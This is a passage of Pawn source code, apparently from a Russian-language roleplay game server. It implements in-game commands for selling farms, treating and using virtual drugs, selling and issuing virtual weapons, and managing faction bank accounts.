	return SendMes(playerid,0x4B00B0AA," Бизнес СТО [%i] выставлен на аукцион!",i-1);
}
CMD:sellfarm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!FGet(playerid)) return SCM(playerid,COLOR_GREY," {B8B8B8} Вы не владеете фермой");
	new i = PTEMP[playerid][pPFarmKey];
	if(GetPVarInt(playerid,"farm_id") == i) return SCM(playerid,COLOR_GREY," Для начала переоденьтесь!");
	if(!PlayerToPoint(10.0, playerid, FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) return SCM(playerid,COLOR_GREY," Необходимо находиться возле фермы!");
	PTEMP[playerid][pBank] += FarmInfo[i][fBank]+FarmInfo[i][fLandTax];
	format(string,40,"~w~Farm it sold~n~~g~$%i",FarmInfo[i][fBank]+FarmInfo[i][fLandTax]);
	GameTextForPlayer(playerid,string, 5000, 3);
	strmid(FarmInfo[i][fOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_4],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_5],"None",0,strlen("None"),MAX_PLAYER_NAME);
	FarmInfo[i][fAuction][0] = 0;
	FarmInfo[i][fAuction][1] = 0;
	FarmInfo[i][fAuction][2] = 0;
	FarmInfo[i][fAuction][3] = 0;
	FarmInfo[i][fAuction][4] = 0;
	FarmInfo[i][fLandTax] = 0;
	FarmInfo[i][fBank] = 0;
	FarmInfo[i][fProds] = 0;
	FarmInfo[i][fZp] = 30;
	FarmInfo[i][fGrain_Price] = 5;
	FarmInfo[i][fGrain] = 0;
	FarmInfo[i][fGrain_Sown] = 0;
	FarmInfo[i][fProds_Selling] = 1;
	FarmInfo[i][fProds_Price] = 21;
	PTEMP[playerid][pPFarmKey] = 999;
	printf("Игрок %s продал ферму [ID: %i]", Name(playerid), i-1);
	return SendMes(playerid,0x4B00B0AA," Бизнес Ферма [%i] выставлен на аукцион!",i-1);
}
CMD:healaddict(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pMember] != 4 && PTEMP[playerid][pMember] != 22 && PTEMP[playerid][pMember] != 33) return SCM(playerid,COLOR_GREY," Вы не медик!");
	if(sscanf(params, "u", params[0]))  return SCM(playerid, -1, " Введите: /healaddict [id игрока]");
	if(!PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773) && !PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773)) return true;
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(seans[params[0]] == 1)return SCM(playerid,COLOR_GREEN, " Следущий сеанс можно провести через час");
	if(PTEMP[params[0]][pAddiction] <1000)return SCM(playerid,COLOR_GREEN, " У пациента меньше чем 1000 зависимости");
	if(params[0] == playerid)return SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
	PTEMP[params[0]][pAddiction] -=500;
	format(YCMDstr,sizeof(YCMDstr), " Медик %s провёл с вами сеанс от наркозависимости",PTEMP[playerid][pName]);
	SCM(params[0],COLOR_GREEN,YCMDstr);
	format(YCMDstr,sizeof(YCMDstr), " Вы провели сеанс от наркозависимости с %s",Name(params[0]));
	SCM(playerid,COLOR_GREEN,YCMDstr);
	seans[params[0]] = 1;
	PTEMP[params[0]][pNarcoLomka] = 0;
	printf("Медик %s провёл сеанс от ломки %s", Name(playerid), Name(params[0]));
	return true;
}
CMD:usedrugs(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(sscanf(params, "i", params[0]))
	{
		if(PTEMP[playerid][pAddiction] < 2000) params[0] = 3;
		else if(PTEMP[playerid][pAddiction] < 5000) params[0] = 10;
		else if(PTEMP[playerid][pAddiction] > 5000) params[0] = 15;
	}
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(PTEMP[playerid][pDrugs] < params[0]) return SCM(playerid, COLOR_GREY," Недостаточно наркотиков");
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Неверное кол-во");
	if(PTEMP[playerid][pAddiction] < 2000 && params[0] > 3) return SCM(playerid,COLOR_GRAD1," Не более 3 грамм");
	else if(PTEMP[playerid][pAddiction] < 5000 && params[0] > 10) return SCM(playerid,COLOR_GRAD1," Не более 10 грамм");
	else if(params[0] > 15) return SCM(playerid,COLOR_GRAD1," Не более 15 грамм");
	if(PTEMP[playerid][pAddiction] < 2000 && health+ 10.0*params[0] > 120)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 120 ))"), SetPlayerHealthAC(playerid,120);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуту ))");
		SetPlayerTime(playerid,17,0);
		SetPlayerWeather(playerid, -67);
		SetTimerEx("AddictionTimer", 20000, false, "i", playerid);
	}
	else if(PTEMP[playerid][pAddiction] < 5000 && health+ 10.0*params[0] > 140)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 140 ))"), SetPlayerHealthAC(playerid,140);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуту ))");
	}
	else if(PTEMP[playerid][pAddiction] > 5000 && health+10.0*params[0] > 160)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 160 ))"), SetPlayerHealthAC(playerid,160);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуты ))");
	}
	else
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SendMes(playerid,-1," (( Здоровье пополнено до: %.0f ))",health+10*params[0]), SetPlayerHealthAC(playerid, health + 10.0*params[0]);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуты ))");
		if(PTEMP[playerid][pAddiction] < 2000)
		{
			SetPlayerTime(playerid,17,0);
			SetPlayerWeather(playerid, -68);
			SetTimerEx("AddictionTimer", 10000, false, "i", playerid);
		}
	}
	PTEMP[playerid][pNarcoLomka] = 0;
	switch(booston)
	{
	case 0:SetPVarInt(playerid,"drug_time", gettime() + 60);
	case 1:SetPVarInt(playerid,"drug_time", gettime() + 39);
	}
	PTEMP[playerid][pDrugs] -= params[0];
	ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
	SetPlayerChatBubble(playerid,"Употребил(a) наркотик",COLOR_PURPLE,30.0,10000);
	format(YCMDstr,sizeof(YCMDstr), " %s употребил(a) наркотик",PTEMP[playerid][pName]);
	ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	PTEMP[playerid][pAddiction] += 4*params[0];
	SendMes(playerid, -1, " (( Осталось: %i грамм ))", PTEMP[playerid][pDrugs]);
	if(startaddiction[playerid] == 1)
	{
		startaddiction[playerid] = 0;
		ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
		PTEMP[playerid][pNarcoLomka] = 0;
	}
	printf("Игрок %s употребил наркотики", Name(playerid));
	return true;
}
CMD:gunlist(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid) && !IsABiker(playerid)) return true;
	ShowPlayerDialogEx(playerid,8321,DIALOG_STYLE_MSGBOX, "Cписок оружия", "\tИмя\t\t материалов за патрон\t\t материалов за обойму\n__________________________________________________________________\n\n[ID: 23] Sdpistol\t\t1м\t\t\t\t15м\n[ID: 24] Deagle\t\t\t3м\t\t\t\t21м\n[ID: 25] Shotgun\t\t3м\t\t\t\t-\n[ID: 29] SMG\t\t\t2м\t\t\t\t60м\n[ID: 30] AK-47\t\t\t3м\t\t\t\t90м\n[ID: 31] M4A1\t\t\t3м\t\t\t\t150м\n[ID: 33] Rifle\t\t\t5м\t\t\t\t-", "Закрыть", "");
	return true;
}
CMD:bsellgun(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!IsABiker(playerid)) return true;
	new gunname[22];
	if(sscanf(params, "s[18]ddu",gunname,params[0],params[1],params[2]))
	{
		SCM(playerid, -1," Введите: /bsellgun [название оружия] [патроны] [цена] [playerid]");
		SCM(playerid, -1," Введите: /gunlist - название оружия и расходы материалов");
		return true;
	}
	if(params[1] > 50000 || params[1] < 4 || params[0] < 0) return SCM(playerid,COLOR_GREY," Неверная цена/патроны");
	if(!ProxDetectorS(5.0, playerid, params[2])) return SCM(playerid, COLOR_GREY, "Человек должен быть рядом с вами");
	if(strcmp(gunname,"sdpistol", true) == 0) SetPVarInt(params[2],"Sell_Gun",23), SetPVarInt(params[2],"Sell_GunMats",1);
	else if(strcmp(gunname,"deagle", true) == 0) SetPVarInt(params[2],"Sell_Gun",24), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"shotgun", true) == 0) SetPVarInt(params[2],"Sell_Gun",25), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"smg", true) == 0) SetPVarInt(params[2],"Sell_Gun",29), SetPVarInt(params[2],"Sell_GunMats",2);
	else if(strcmp(gunname,"ak47", true) == 0) SetPVarInt(params[2],"Sell_Gun",30), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"m4", true) == 0) SetPVarInt(params[2],"Sell_Gun",31), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"rifle", true) == 0) SetPVarInt(params[2],"Sell_Gun",33), SetPVarInt(params[2],"Sell_GunMats",5);
	else return SCM(playerid,COLOR_GREY," Неизвестное оружие");
	if(PTEMP[playerid][pMats] < (GetPVarInt(playerid,"Sell_GunMats")*params[0])) return SCM(playerid, COLOR_GREY, " У вас недостаточно материалов!");
	if(playerid == params[2])
	{
		GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]);
		PTEMP[playerid][pMats] -= (GetPVarInt(playerid,"Sell_GunMats")*params[0]);
		format(YCMDstr, sizeof(YCMDstr), " %s сделал себе оружие из материалов",PTEMP[playerid][pName]);
		ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return true;
	}
	SetPVarInt(params[2],"Sell_GunId",playerid);
	SetPVarInt(params[2],"Sell_GunAmmo",params[0]);
	SetPVarInt(params[2],"Sell_GunPrice",params[1]);
	SetPVarInt(params[2],"Sell_GunMats",GetPVarInt(params[2],"Sell_GunMats")*params[0]);
	SendMes(params[2],COLOR_BLUE, " %s предлагает вам купить оружие %s. Патроны: %i",PTEMP[playerid][pName],gunname,params[0]);
	SCM(params[2],COLOR_BLUE," Введите: /accept gun для покупки оружия");
	SCM(playerid, 0x6495EDFF, " Вы предложили купить оружие!");
	return true;
}
CMD:sellgun(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вам недоступна данная команда!");
	new gunname[22];
	if(sscanf(params, "s[18]ddu",gunname,params[0],params[1],params[2]))
	{
		SCM(playerid, -1," Введите: /sellgun [название оружия] [патроны] [цена] [playerid]");
		SCM(playerid, -1," Введите: /gunlist - название оружия и расходы материалов");
		return true;
	}
	if(params[1] > 50000 || params[1] < 4 || params[0] < 0) return SCM(playerid,COLOR_GREY," Неверная цена/патроны");
	if(!ProxDetectorS(5.0, playerid, params[2])) return SCM(playerid, COLOR_GREY, "Человек должен быть рядом с вами");
	if(strcmp(gunname,"sdpistol", true) == 0) SetPVarInt(params[2],"Sell_Gun",23), SetPVarInt(params[2],"Sell_GunMats",1);
	else if(strcmp(gunname,"deagle", true) == 0) SetPVarInt(params[2],"Sell_Gun",24), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"shotgun", true) == 0) SetPVarInt(params[2],"Sell_Gun",25), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"smg", true) == 0) SetPVarInt(params[2],"Sell_Gun",29), SetPVarInt(params[2],"Sell_GunMats",2);
	else if(strcmp(gunname,"ak47", true) == 0) SetPVarInt(params[2],"Sell_Gun",30), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"m4", true) == 0) SetPVarInt(params[2],"Sell_Gun",31), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"rifle", true) == 0) SetPVarInt(params[2],"Sell_Gun",33), SetPVarInt(params[2],"Sell_GunMats",5);
	else return SCM(playerid,COLOR_GREY," Неизвестное оружие");
	if(PTEMP[playerid][pMats] < (GetPVarInt(playerid,"Sell_GunMats")*params[0])) return SCM(playerid, COLOR_GREY, " У вас недостаточно материалов!");
	for(new idx = 1; idx <= TOTALGZ; idx++)
	{
		//if(PlayerToKvadrat(playerid,GZInfo[idx][gCoords][0x0], GZInfo[idx][gCoords][0x1],GZInfo[idx][gCoords][0x2],GZInfo[idx][gCoords][0x3]) && PTEMP[playerid][pMember] == GZInfo[idx][gFrakVlad])
		//{
			if(playerid == params[2])
			{
				if(booston == 0) GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]);
				else if(booston == 1) GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]*3);
				PTEMP[playerid][pMats] -= (GetPVarInt(playerid,"Sell_GunMats")*params[0]);
				format(YCMDstr, sizeof(YCMDstr), " %s сделал себе оружие из материалов",PTEMP[playerid][pName]);
				ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SendMes(playerid, -1, " (( У вас осталось %i материалов с собой ))", PTEMP[playerid][pMats]);
				return true;
			}
			SetPVarInt(params[2],"Sell_GunId",playerid);
			SetPVarInt(params[2],"Sell_GunAmmo",params[0]);
			SetPVarInt(params[2],"Sell_GunPrice",params[1]);
			SetPVarInt(params[2],"Sell_GunMats",GetPVarInt(params[2],"Sell_GunMats")*params[0]);
			SendMes(params[2],COLOR_BLUE, " %s предлагает вам %s. Патронов: %i. Цена: %i вирт",PTEMP[playerid][pName],gunname,params[0],params[1]);
			SCM(params[2],COLOR_BLUE," Что бы принять введите (/ac)cept gun");
			SCM(playerid, 0x6495EDFF, " Вы предложили купить оружие!");
			break;
		//}
	}
	return true;
}
CMD:getgun(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pMember])
	{
	case 5:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PTEMP[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, " Оружие можно взять с 3 ранга!");
					if(wareLcnLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2014, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PTEMP[params[0]][pMember] != PTEMP[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareLcnLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PTEMP[playerid][pRank] <= 5)return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2014, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 6:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PTEMP[playerid][pRank] < 3) return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 3 ранга!");
					if(wareYakuzaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2013, DIALOG_STYLE_LIST, "Взять оружие со склада Yakuza", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PTEMP[params[0]][pMember] != PTEMP[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareYakuzaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PTEMP[playerid][pRank] <= 5) return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2013, DIALOG_STYLE_LIST, "Взять оружие со склада Yakuza", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 14:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PTEMP[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 3 ранга!");
					if(wareRmLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2015, DIALOG_STYLE_LIST, "Взять оружие со склада Russian Mafia", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PTEMP[params[0]][pMember] != PTEMP[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareRmLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PTEMP[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2015, DIALOG_STYLE_LIST, "Взять оружие со склада Russian Mafia", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 24:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PTEMP[playerid][pRank] < 2) return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(wareHAMLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2017, DIALOG_STYLE_LIST, "Взять оружие со склада Hell's Angels MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	case 26:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PTEMP[playerid][pRank] < 2)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(warePMCLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2019, DIALOG_STYLE_LIST, "Взять оружие со склада Warlocks MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	case 29:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PTEMP[playerid][pRank] < 2)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(wareWCMLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2022, DIALOG_STYLE_LIST, "Взять оружие со склада Pagans MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	}
	return true;
}
CMD:bbank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pMember] == 24 || PTEMP[playerid][pMember] == 26 || PTEMP[playerid][pMember] == 29)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /bbank [количество]");
	if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
	if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	switch(PTEMP[playerid][pMember])
	{
	case 24:
		{
			FracBank[0][fHamc] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Hell's Angels MC: %i вирт", params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	case 26:
		{
			FracBank[0][fWmc] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Warlocks MC: %i вирт",params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	case 29:
		{
			FracBank[0][fPmc] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Pagans MC: %i вирт", params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	}
	return true;
}
CMD:bwithdraw(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] == 23 || PTEMP[playerid][pLeader] == 24 || PTEMP[playerid][pLeader] == 25 || PTEMP[playerid][pLeader] == 26 || PTEMP[playerid][pLeader] == 27 || PTEMP[playerid][pLeader] == 28 || PTEMP[playerid][pLeader] == 29 || PTEMP[playerid][pLeader] == 30 || PTEMP[playerid][pLeader] == 31 || PTEMP[playerid][pLeader] == 32 )
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /bwithdraw [количество]");
	if(PTEMP[playerid][pMember] == 24 && PTEMP[playerid][pRank] == 9)
	{
		if(FracBank[0][fHamc] == 0) { SCM(playerid, COLOR_GREY, "В банке Hell's Angels MC нет денег"); return true; }
		if(FracBank[0][fHamc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Hell's Angels MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fHamc] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Hell's Angels MC: %i вирт",params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Hell's Angels MC %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 26 && PTEMP[playerid][pRank] == 9)
	{
		if(FracBank[0][fWmc] == 0) { SCM(playerid, COLOR_GREY, "В банке Highwayman MC нет денег"); return true; }
		if(FracBank[0][fWmc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Highwayman MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fWmc] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Highwayman MC: %i вирт", params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Warlocks MC %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 29 && PTEMP[playerid][pRank] == 9)
	{
		if(FracBank[0][fPmc] == 0) { SCM(playerid, COLOR_GREY, "В банке Pagans MC нет денег"); return true; }
		if(FracBank[0][fPmc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Pagans MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fPmc] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Pagans MC: %i вирт", params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Pagans MC %i вирт", PTEMP[playerid][pName], params[0]);
	}
	return true;
}
CMD:bbalance(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pMember])
	{
	case 24:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Hell's Angels MC: %i вирт", FracBank[0][fHamc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	case 26:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Warlocks MC: %i вирт", FracBank[0][fWmc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	case 29:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Pagans MC: %i вирт", FracBank[0][fPmc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	default: SCM(playerid,COLOR_GREY," Вам недоступна данная команда");
	}
	return true;
}
CMD:warehouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pMember])
	{
	case 1:
		{
			format(string, 128, " На складе Police LS %i/100000 материалов", lspdmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 2:
		{
			format(string, 128, " На складе FBI %i/100000 материалов", fbimats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 3:
		{
			format(string, 128, " На военном складе SF: %i материалов", armmatsf);
			SCM(playerid, COLOR_BLUE, string);
			format(string, 128, " На военном складе LS: %i материалов", lsamatbi);
			SCM(playerid, 0x66FBA6FF, string);
			return true;
		}
	case 5:
		{
			if(wareLcnLock)
			format(string, 128, " На складе LCN %i/100000 материалов {FF0000}Склад закрыт", lcnmats);
			else
			format(string, 128, " На складе LCN %i/100000 материалов {00FF00}Склад закрыт", lcnmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 6:
		{
		    if(wareYakuzaLock)
   			format(string, 128, " На складе Yakuza %i/100000 материалов {FF0000}Склад закрыт", yakuzamats);
   			else
